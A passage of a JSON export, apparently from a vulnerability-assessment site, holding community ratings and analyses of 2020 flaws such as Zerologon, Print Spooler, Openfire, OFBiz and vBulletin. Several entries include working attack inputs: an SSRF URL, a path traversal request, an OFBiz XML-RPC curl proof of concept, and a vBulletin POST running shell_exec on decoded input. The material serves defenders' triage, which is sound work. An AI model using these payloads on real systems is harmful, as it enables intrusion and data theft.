      "document": "> This bug affects not only Grafana instances, but also Gitlab instances (under the `/-/grafana` path) and SourceTree instances (under the `/-/debug/grafana/` path).\r\n\r\nThis also affects GitLab, which presumably bundles Grafana. GitLab versions prior to 13.1.1 are affected. This increases the attack surface beyond just Grafana.\r\n\r\nWhile I consider this a \"primitive\" in an exploit chain, it will certainly be useful to bug bounty hunters and the like. Seems [people on Twitter](https://twitter.com/Rhynorater/status/1289737181850775552) may have gotten it to work already.",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "pre_auth",
          "exploited_in_the_wild"
        ],
        "attacker-value": 4,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "919afad6-614e-43d9-a78e-e5711cca7a66",
      "editorId": "9c3c0bdd-7a98-48de-a889-f351a2aec7cf",
      "topicId": "63a96584-6094-4433-8ae0-1c1cd1b1c345",
      "created": "2020-08-04T16:15:02.803493Z",
      "revisionDate": "2020-08-04T16:15:02.807709Z",
      "document": "SANS ISC has said they're seeing \"small numbers of exploit attempts.\" The exploit they've detected is identifying vulnerable systems \"by reading benign LUA source code files.\" \r\n\r\nhttps://isc.sans.edu/diary/26426",
      "score": 1,
      "metadata": {
        "tags": [
          "exploited_in_the_wild"
        ]
      },
      "tags": [
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        }
      ]
    },
    {
      "id": "262a432c-ac4a-401a-8dc5-6d4c194902ca",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "34edffd6-f1d3-409e-a748-b4d6f923ce14",
      "created": "2020-08-04T16:42:57.118099Z",
      "revisionDate": "2020-08-06T02:02:48.766186Z",
      "document": "More detail\r\nhttps://swarm.ptsecurity.com/openfire-admin-console/\r\n\r\nStupid easy SSRF\r\n>/getFavicon?host=192.168.176.1:8080/secrets.txt?",
      "score": 2,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "94228184-cfc3-4e81-83b8-7c62b1936de3",
      "editorId": "2ccacbe6-ae15-400a-8cd0-57acc7fb593c",
      "topicId": "3ed26c7b-ce17-447d-becc-cc9f425c1f9c",
      "created": "2020-08-04T16:44:24.946276Z",
      "revisionDate": "2020-09-18T14:39:16.786527Z",
      "document": "More detail:\r\nhttps://swarm.ptsecurity.com/openfire-admin-console/\r\n\r\nStupid easy\r\n>GET /plugins/search/..\\..\\..\\conf\\openfire.xml",
      "score": 3,
      "metadata": {
        "tags": [
          "common_enterprise"
        ],
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        }
      ]
    },
    {
      "id": "e2036df1-709f-4439-8ae3-4d6b6098afd9",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "7db94c33-6059-450a-b6e1-fbbe256fce80",
      "created": "2020-08-04T17:44:42.165606Z",
      "revisionDate": "2020-08-06T01:57:55.26033Z",
      "document": "This vulnerability was patched February  2020, but there is renewed interest in it thanks to [research by wetw0rk](https://github.com/wetw0rk/CA-UIM-Nimbus-Research) and their submission of a recent [Metasploit Module](https://github.com/rapid7/metasploit-framework/pull/13875). The underlying vulnerability here is a lack of authenticated controls on the Nimbus protocol itself, which allows an attacker to simply run arbitrary commands on the target. This combined with CVE-2020-8012 allows arbitrary code execution as well.\r\n\r\nYou are unlikely to see this on the internet (the only boxes I found on Shodan listening on TCP port 48000 were NAS devices using it as the NFS lock service, so it's hard to gauge the wide-spread nature) but this is more commonly used as mass-deployments in cloud environments or server environments. Since it is the robot/controller that is vulnerable, potentially every target in a managed environment is vulnerable to this if it has the vulnerable version of the Nimsoft software installed. If an enterprise is using this software, it's likely an attacker will be able to easily use it to control the whole environment if it is left vulnerable, and could likely become an easy crypto locking target.",
      "score": 5,
      "metadata": {
        "tags": [
          "easy_to_develop",
          "pre_auth"
        ],
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "2ac07775-4193-44f2-adff-6f671c76b5c0",
      "editorId": "58f30415-b389-4a5e-99ef-e4246ce7e8cc",
      "topicId": "d179c673-bb99-4f4c-9d19-8ff081a85c1f",
      "created": "2020-08-05T18:48:18.327031Z",
      "revisionDate": "2020-08-09T13:52:30.329977Z",
      "document": "If you actually have a working Secure Boot installation in the first place and rely on it, yes this is a problem.\r\n\r\nHowever, whether that is true is specific to your environment. Many cloud environments (like AWS), do not support secure boot/UEFI in the first place, so there's no point to worrying about this; an attacker could just replace your grub binary already, or kernel, or anything else. You're better off monitoring VM reboots for this kind of attack, and reprovisioning if that happens. Since this is basically a persistence mechanism, it seems like there are lot of other lower-hanging mechanisms that could also work. By the time you've bothered getting root or physical access, you could do so much else in the mean time. I can't imagine this being in the top 50 things an attacker would try to do, outside of a supply chain attack of some sort.",
      "score": 6,
      "metadata": {
        "tags": [
          "common_enterprise",
          "default_configuration",
          "difficult_to_patch",
          "requires_elevated_access"
        ],
        "attacker-value": 2,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "0e696d6d-665a-48bd-9636-06d0a3a2a211",
          "name": "Requires elevated access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_elevated_access"
        }
      ]
    },
    {
      "id": "9d01f154-66d1-48e7-a12f-71e740c559fb",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "77ec4d6c-a9f5-48ea-bd45-64ac09c4e8ad",
      "created": "2020-08-06T11:59:05.47047Z",
      "revisionDate": "2020-08-06T12:22:46.870574Z",
      "document": "There is a vulnerability in Teamviewer that will attempt to access a remote SMB site when a user visits a malicious website.  Part of a smb handshake involves the exchange of credentials.  The SMB handshake would contain the username and hashed password of the user.  Attackers could redirect the connection with something like responder and/or store the hash for later cracking.\r\nAffected versions are 8 -15.8.2; 15.8.3 is the first patched version.  Administrators should patch immediately of attempt to disable SMB connections from local networks if possible.",
      "score": 2,
      "metadata": {
        "tags": [
          "pre_auth",
          "common_enterprise",
          "default_configuration",
          "easy_to_develop"
        ],
        "attacker-value": 3,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "c2299374-fce8-4ec4-a288-5641986d1b52",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "5a05d3a2-36c3-4215-8987-afc104e98883",
      "created": "2020-08-06T14:51:32.189713Z",
      "revisionDate": "2020-08-11T12:31:46.383873Z",
      "document": "This is a dll hijack against Phillips SmartControl software that provides a privilege escalation.  It requires an attacker to place a dll payload in a location writable to low-privilege user and having the user restart the application (or wait for a reboot).  This would likely also be a good method for elevated persistence.  As the software is likely not present in many enterprise settings and it requires user interaction or reboot, I think this has lower attacker value, but it would be very useful under those limited circumstances.\r\nMitigations might be as simple as creating dummy DLL files in the four locations created as SYSTEM or Administrator, preventing the attacker from a trivial low-privileges overwrite, adding the file locations to HIDS, or patching the software in question to something above 4.3.15",
      "score": 3,
      "metadata": {
        "tags": [
          "requires_interaction",
          "post_auth",
          "default_configuration"
        ],
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "180d6ef2-4cff-4288-a646-867844401eaa",
      "editorId": "ba7d1514-7156-496b-8642-ed75d18e5d9b",
      "topicId": "a445d23e-9b9d-431c-b9b3-46fb8149ef78",
      "created": "2020-08-06T18:40:21.028767Z",
      "revisionDate": "2020-11-21T22:24:15.00298Z",
      "document": "This is a print spooler vulnerability similar to CVE-2020-1048, but it uses a specially-crafted *.SHD to trigger a print to a trusted location.  Introduced at Blackhat on August 6, 2020, a patch is expected to appear next week in Microsoft's patch Tuesday.\r\nThe vulnerability does require low privilege access and for the spooler service to restart.\r\nPoC will be uploaded to https://github.com/SafeBreach-Labs/spooler on August 12.\r\nThis is extremely valuable to attackers.  The exploit is most likely present on all versions of Windows from Windows 7 to present and the race is now on to patch it while PoCs are already in the wild.",
      "score": 5,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "6908548c-ae3d-42f6-8f63-c3a65f996ed4",
      "editorId": "769a207c-ca81-467c-8bcb-673ea74bfb6b",
      "topicId": "a445d23e-9b9d-431c-b9b3-46fb8149ef78",
      "created": "2020-08-11T08:19:00.643891Z",
      "revisionDate": "2020-11-21T22:24:14.840241Z",
      "document": "CVE-2020-1337 is a bypass of (PrintDemon) CVE-2020-1048\u2019s patch via a Junction Directory, made to remediate an Elevation of Privileges (EoP)\\Local Privilege Escalation (LPE) vulnerability affecting the Windows\u2019 Print Spooler Service. The vulnerability does require low privilege access and for the spooler service to restart.\r\nThe patch appeared in Microsoft\u2019s patch Tuesday (11th August 2020) - https://portal.msrc.microsoft.com/en-us/security-guidance/advisory/CVE-2020-1337#ID0EWIAC.\r\n\r\nVulnerability description, root cause analysis and PoC code on https://voidsec.com/cve-2020-1337-printdemon-is-dead-long-live-printdemon/",
      "score": 7,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "b65c2492-bb05-477a-86bb-0c9569f80141",
          "name": "Authenticated",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "post_auth"
        }
      ]
    },
    {
      "id": "8486842f-cc59-42b6-a3bb-16665483af7b",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "f191686b-8b78-4b9b-abd5-ca8e21afc7a6",
      "created": "2020-08-11T21:33:42.173705Z",
      "revisionDate": "2020-08-11T21:49:50.017912Z",
      "document": "A vulnerability exists within Windows that can allow file signature validation to be bypassed. This would allow an attacker to load and execute PE files without having signed them, possibly masquerading as a legitimate signature. This would be useful if the system the attacker is on requires signatures for all files or if the attacker wanted to load a library into a process where signatures are enforced.\r\n\r\nThis would not grant elevated privileges without being combined with an additional primitive.\r\n\r\nWhile this is being actively exploited in the wild, at this time there are few public details on the vulnerability.",
      "score": 2,
      "metadata": {
        "attacker-value": 2,
        "exploitability": 3
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "47cad8d6-8c9d-42f5-bd6e-b31e7b95ff5e",
          "name": "Exploited in the wild (DEPRECATED)",
          "type": "deprecated",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "exploited_in_the_wild_deprecated"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "cc249289-d74e-4045-8846-e7e31a173e95",
          "name": "No useful access",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "no_useful_data"
        }
      ]
    },
    {
      "id": "7eea795b-fbbb-4a16-807f-9e6cba0c548e",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "7c5703d3-9e18-4f5c-a4d2-25e1f09b43cb",
      "created": "2020-08-11T22:15:36.117341Z",
      "revisionDate": "2021-05-03T22:04:36.14519Z",
      "document": "The [advisory](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-1472) suggests that an unauthenticated attacker, presumably already on a domain-joined host, can connect to a DC over [NRPC](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/ff8f970f-3e37-40f7-bd4b-af7336e4792f) and escalate to DA. That's pretty significant, but we have no additional details to go by, short of looking at the patch.\r\n\r\nNotably, the patch is [partial](https://support.microsoft.com/en-us/help/4557222/how-to-manage-the-changes-in-netlogon-secure-channel-connections-assoc), and the second phase won't be rolled out until Q1 2021. If attackers can figure out how to weaponize this, it could be a valuable escalation path to DA.\r\n\r\nETA: [Technical details](https://www.secura.com/blog/zero-logon) and a [PoC check](https://github.com/SecuraBV/CVE-2020-1472) are available. Please see the [Rapid7 Analysis](https://attackerkb.com/topics/7FbcgDOidQ/cve-2020-1472?#rapid7-analysis) for more detailed information.\r\nETAA: [Source](https://twitter.com/wvuuuuuuuuuuuuu/status/1305948227317923842) and [spec](https://twitter.com/wdormann/status/1305955641924747264) confirmation that Samba is also affected by this vulnerability. Hint: look for `ZERO_STRUCT(iv);`.\r\nETAAA: Microsoft has confirmed that Zerologon is being [exploited in the wild](https://twitter.com/MsftSecIntel/status/1308941504707063808).",
      "score": 9,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "1a4228a8-bc05-41a0-a7ee-43d4fa7e381e",
          "name": "Difficult to patch",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "difficult_to_patch"
        },
        {
          "id": "8f7ef49d-26f4-46b1-9676-599f6669f4d3",
          "name": "Gives privileged access",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "high_privilege_access"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "e7fc8906-91ed-4074-9db4-36afc02a848b",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "f65cf017-1855-42e3-9922-bf6f9f078dd9",
      "created": "2020-08-11T22:53:52.494836Z",
      "revisionDate": "2020-11-22T02:34:06.632253Z",
      "document": "Update: Reported as exploited in the wild as part of Google's 2020 0day vulnerability spreadsheet they made available at https://docs.google.com/spreadsheets/d/1lkNJ0uQwbeC1ZTRrxdtuPLCIl7mlUreoKfSIgajnSyY/edit#gid=1869060786. Original tweet announcing this spreadsheet with the 2020 findings can be found at https://twitter.com/maddiestone/status/1329837665378725888\r\n\r\nTLDR: Originally this was written as a low priority issue, however after further discussions internally we are upping the risk due to the fact that IE 11 is installed on every Windows computer and cannot be removed (as it is an OS component), and the fact that there still remains the risk of attack via social engineering, which could get around many of the originally proposed mitigations.\r\n\r\nOriginally I wrote this as a low priority issue, however after looking into it more I'm upping the risk on this as IE 11 is installed by default on every Windows system and it cannot be removed, which means that with some social engineering, its possible to compromise any Windows user's computer. Above all else this factor should be kept in mind as it means that even if an organization doesn't have IE set as its default, all it takes is a user who is convinced that to download some info they require they need to use IE instead of Firefox, and a malicious website, and attackers will start to have a foothold within the network.\r\n\r\nNow what are some of the limiting factors here? Well you can't uninstall IE, as it is integrated into every Windows operating system and is considered an OS component. This explains the point above as to why this vulnerability really does affect pretty much every single Windows user. However if organizations implement policies or protections that block IE from being run, then users will not be able to open IE and therefore trigger the vulnerability.\r\n\r\nThe other point to note is that according to https://gs.statcounter.com/browser-market-share, only 1.28% of people use IE these days, compared to 65.89% of people that use Chrome. The closest competitor there is Safari at a little over 16%. This means that this vulnerability is likely to be more of a risk to enterprises where IE use is more likely due to the prevalence of legacy systems and software, and is unlikely to affect the average home user.\r\n\r\nHowever, keep in mind that particularly in the government space, there are many organizations that still use IE by default or which require users to interact with their legacy applications using IE (due to compatibility issues or similar). These organizations need to patch this issue as soon as possible as all it takes to exploit this issue is one user browsing to a site with a malicious advertisement or one user clicking a link in a malicious email for that user to be compromised.\r\n\r\nFor those that are not using IE by default this issue will be slightly less of a risk due to the need for attackers to conduct social engineering attacks against end users to convince them to load a malicious site in IE, however remember that all it takes is one user clicking on a link for attackers to start gaining a deeper foothold into your network. Even if the social engineering attack only nets a 10% success rate, if your targeting an organization of 1000 users, that's 100 users that are now compromised, all of which could provide an attacker with unique possibilities to escalate their privileges within your network.",
      "score": 4,
      "metadata": {
        "attacker-value": 4
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        },
        {
          "id": "01c67142-c23f-4ee7-8803-49d10d588299",
          "name": "Requires user interaction",
          "type": "common",
          "metadata": {
            "value": "low",
            "source": "system"
          },
          "code": "requires_interaction"
        }
      ]
    },
    {
      "id": "274519bd-a877-4d21-97e8-80f72eeefdc3",
      "editorId": "110c4bc0-d96d-4bdc-a633-e66ae23e7b9b",
      "topicId": "274e3983-7823-4cd0-b47c-0ebc25dd5646",
      "created": "2020-08-13T20:00:37.56573Z",
      "revisionDate": "2020-09-03T20:47:24.104577Z",
      "document": "Pre-auth RCE in [ERP](https://en.wikipedia.org/wiki/Enterprise_resource_planning) software that's free and isn't SAP? Sweet. And it's a long-standing Apache project that's often recommended. Here's a PoC:\r\n\r\n```\r\nwvu@kharak:~$ curl -vH \"Content-Type: text/xml\" http://127.0.0.1:8080/webtools/control/xmlrpc -d '<?xml version=\"1.0\"?><methodCall><methodName>foo</methodName><params><param><value><struct><member><name>bar</name><value><serializable xmlns=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"></serializable></value></member></struct></value></param></params></methodCall>'\r\n*   Trying 127.0.0.1...\r\n* TCP_NODELAY set\r\n* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)\r\n> POST /webtools/control/xmlrpc HTTP/1.1\r\n> Host: 127.0.0.1:8080\r\n> User-Agent: curl/7.64.1\r\n> Accept: */*\r\n> Content-Type: text/xml\r\n> Content-Length: 273\r\n>\r\n* upload completely sent off: 273 out of 273 bytes\r\n< HTTP/1.1 200 OK\r\n< Server: Apache-Coyote/1.1\r\n< Set-Cookie: JSESSIONID=D090A373F50D50CF8CFCF2F9E301D04A.jvm1; Path=/webtools/; Secure; HttpOnly\r\n< Set-Cookie: OFBiz.Visitor=10221; Expires=Fri, 13-Aug-2021 19:57:20 GMT; Path=/\r\n< Content-Type: text/xml;charset=UTF-8\r\n< Transfer-Encoding: chunked\r\n< Vary: Accept-Encoding\r\n< Date: Thu, 13 Aug 2020 19:57:20 GMT\r\n<\r\n* Connection #0 to host 127.0.0.1 left intact\r\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><methodResponse xmlns:ex=\"http://ws.apache.org/xmlrpc/namespaces/extensions\"><fault><value><struct><member><name>faultCode</name><value><i4>0</i4></value></member><member><name>faultString</name><value>Failed to read result object: null</value></member></struct></value></fault></methodResponse>* Closing connection 0\r\nwvu@kharak:~$\r\n```\r\n\r\nA lot of orgs rely on ERP software, and you're bound to find sensitive information in an ERP system. Note that these systems will likely be inside the network perimeter. High value for pentesters on an internal, I'd say.\r\n\r\nNote that the [CVE](https://nvd.nist.gov/vuln/detail/CVE-2020-9496) seems to conflate this with XSS. CVSS score seems lower than I'd expect.\r\n\r\nETA: Here's an exploit: https://github.com/rapid7/metasploit-framework/pull/14000.",
      "score": 4,
      "metadata": {
        "attacker-value": 5,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "392ac474-91f1-4944-ad4f-78ce648b2df7",
          "name": "Common in enterprise",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "common_enterprise"
        },
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        },
        {
          "id": "02c27d86-7690-4074-8f1e-dead30c1e2fa",
          "name": "Vulnerable in default configuration",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "default_configuration"
        }
      ]
    },
    {
      "id": "b63702d5-0ed9-404d-9211-4dd0fed7e30e",
      "editorId": "1754d880-537c-48c4-8738-5ad2ccde5258",
      "topicId": "5e7d92c4-95c2-4657-a64b-b29abfc4c3dd",
      "created": "2020-08-13T21:24:57.731101Z",
      "revisionDate": "2020-08-14T13:17:26.399147Z",
      "document": "This vulnerable allows an unauthenticated attacker to run arbitrary PHP code or operating system commands on affected versions of the vBulletin web application. The vulnerability, which was also discovered by Zenofex, is identified as CVE-2020-7373 and is effectively a bypass for a previously patched vulnerability identified as CVE-2019-16759. Administrators running vBulletin should patch this one immediately.\r\n\r\nExample POST request that would trigger the vulnerability:\r\n```\r\nPOST /ajax/render/widget_tabbedcontainer_tab_panel HTTP/1.1\r\nHost: 192.168.249.2\r\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 168\r\n\r\nsubWidgets%5b0%5d%5btemplate%5d=widget_php&subWidgets%5b0%5d%5bconfig%5d%5bcode%5d=echo%20shell_exec%28base64_decode%28%27ZWNobyB3elV4d2VJag%3d%3d%27%29%29%3b%20exit%3b\r\n```",
      "score": 3,
      "metadata": {
        "attacker-value": 4,
        "exploitability": 5
      },
      "tags": [
        {
          "id": "067ecf0c-8227-4437-bc04-a92d84b545bb",
          "name": "Easy to weaponize",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "easy_to_develop"
        },
        {
          "id": "240789d2-3e0b-4967-a6a4-8f09029f642d",
          "name": "Unauthenticated",
          "type": "common",
          "metadata": {
            "value": "high",
            "source": "system"
          },
          "code": "pre_auth"
        }
      ]
    },
    {
      "id": "b79288be-9c4d-44ad-936e-3811dbed9a33",
      "editorId": "b50031c2-b390-4cf9-bf6f-7a5fb8cf8677",
      "topicId": "759d7d72-0f44-41a9-a79c-835caa676580",
      "created": "2020-08-17T17:24:00.893252Z",
      "revisionDate": "2020-08-17T22:22:31.073356Z",
      "document": "Looking at the patch for this vulnerability, one can see that a new function was added, `UShortAdd`. Looking at this, I immediately thought that this might be a integer overflow vulnerability. Turns out I was right, but the actual bug is a little bit tricky to determine at first glance. This is cause when calculating the size for a heap allocation which is performed via a call to `Dns_AllocZero`, several functions first correctly convert the user's input to an unsigned value, by using `movzx` to convert the attacker's input, stored in the RCX register, into an unsigned integer after first adding 0x32 to its value. The result is then stored in RAX.\r\n\r\nThe problem comes in when it then goes ahead and tries to adjust this value further. In the case of the `SigRecordCopy` function, this is done by attempting to add 0x28 to AX. This is an issue as if AX is a large number, then adding 0x28 could cause it to overflow into a large negative number. In `SigRecordCopy`, this value is then incremented by 0x20 before then being used as the number of bytes to allocate on the process heap with `Dns_AllocZero`, meaning that the attacker can cause `dnsrslvr.dll` to allocate an undersized heap buffer, which is subsequently filled with data via a call to `memcpy` later on within the `SigRecordCopy` function.\r\n\r\nThis same logic was applied to a total of 6 different functions, which are listed below:\r\n\r\n1. SigRecordCopy\r\n2. NsecRecordCopy\r\n3. KeyRecordCopy\r\n4. OptRecordCopy\r\n5. DhcidRecordCopy\r\n6. Nsec3RecordCopy\r\n\r\nAs far as attacking these vulnerabilities go, there are a number of good and bad things to consider here. The first is that the overflow takes place on the process heap, which generally speaking is harder to exploit than a normal stack overflow, however articles like https://blog.rapid7.com/2019/06/12/heap-overflow-exploitation-on-windows-10-explained/ have shown that it is possible to gain reliable control over the process heap assuming certain requirements are met. The main issue in exploiting this likely would be the need to find a separate information leak to exploit more recent machines and bypass the DEP + ASLR protections that will be enabled on them. \r\n\r\nOn the other hand the good news is that some of these affected functions are very short so it is unlikely that an attacker would have issues with stray instructions messing up their exploit should they manage to find a good information leak. Also since this is a local privilege escalation, then since the attacker would have local access to the victim's machine, they would likely be able to have more opportunities to find DEP/ASLR bypasses that might not otherwise be exploitable remotely.\r\n\r\nFinally given the nature of this bug, it seems likely that an attacker would have to set up some sort of malicious DNS server, and then they would have to query it. The result would then be placed in the DNS resolver cache, and when the same query is made again, the corresponding record copying function would be called within `dnsrslvr.dll`, which would then cause the heap overflow. This is just my initial guess though based on the expected behavior of `dnsrslvr.dll` though.",
      "score": 3,
      "metadata": {
        "attacker-value": 3,
        "exploitability": 2
      },
      "tags": [
        {
